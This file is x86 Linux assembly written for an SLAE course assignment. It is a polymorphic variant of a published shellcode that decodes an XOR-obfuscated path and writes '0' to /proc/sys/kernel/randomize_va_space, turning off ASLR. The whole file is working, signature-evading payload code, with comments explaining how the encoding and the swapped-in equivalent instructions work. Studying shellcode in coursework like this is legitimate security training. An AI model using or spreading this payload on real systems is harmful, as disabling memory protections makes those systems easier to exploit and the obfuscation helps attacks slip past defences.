;Original Source Code URL : http://shell-storm.org/shellcode/files/shellcode-813.php
;Title:	Linux x86 ASLR deactivation - 83 bytes
;Author:	Jean Pascal Pereira <pereira@secbiz.de>
;Web:	http://0xffe4.org

;Modified Polymorphic Shellcodes as per SLAE Assignment # 6
;Assignment # 6-1
;Title: Polymorphic Shellcodes for Linux x86 ASLR deactivation 
;SLAE-1122
;Acknowledgement # https://stackoverflow.com/questions/19864110/explain-aslr-exploit-written-in-x86-assembly-language/19865345#19865345


global _start			
 
section .text
_start:
	xor eax, eax
	add al, 37
        ; push 0xDD encoded of "//proc/sys/kernel/randomize_va_space" 
	push dword 0xb8bebcad
	push dword 0xae82bcab
	push dword 0x82b8a7b4
	push dword 0xb0b2b9b3
	push dword 0xbcaff2b1
	push dword 0xb8b3afb8
	push dword 0xb6f2aea4
	push dword 0xaef2beb2
	push dword 0xafadf2f2

	decode:
		dec al
		mov cl,[esp+eax]
		xor cl,0xDD  ; xor with 0xDD for getting original shellcode of "//proc/sys/kernel/randomize_va_space"
		mov [esp+eax],cl
                cmp al, ah ;The cmp instruction is used to perform comparison. It's identical to the sub instruction except it does not affect operands.
		jnz decode ;Jump if Not Zero, continue loop for decode. 

   mov [esp+0x24], eax ; "push eax" replacement   
   
   mov    ebx,esp
   
   ;mov  cx,0x2bc
   mov   cx,0x111 
   add   cx,0x1ab ;0x111+0x1ab=0x2bc
   
   ;system call: sys_creat("//proc/sys/kernel/randomize_va_space", 0x2bc)
   
   mov    al,0x8
   int    0x80
  
   mov    ebx,eax
   push   eax
   
   ;mov  dx,0x3a30
   mov dx,0x8f85  
   sub dx,0x5555 ;0x8f85-0x5555=0x3a30
   push   dx
   mov    ecx,esp
   xor    edx,edx
   inc    edx
   
   ;sys_write(fd, "0:", 1)
   
   ;mov   al,0x4
   mov    al,0x5
   dec    al ; 0x5 dec will be 0x4
   int    0x80
  
   ;sys_close(fd)
  
   ;mov   al,0x6
   mov    al,0x5
   inc    al ;0x5 inc will be 0x6
   int    0x80
  
   ;sys_waitpid()
  
   inc    eax
   int    0x80

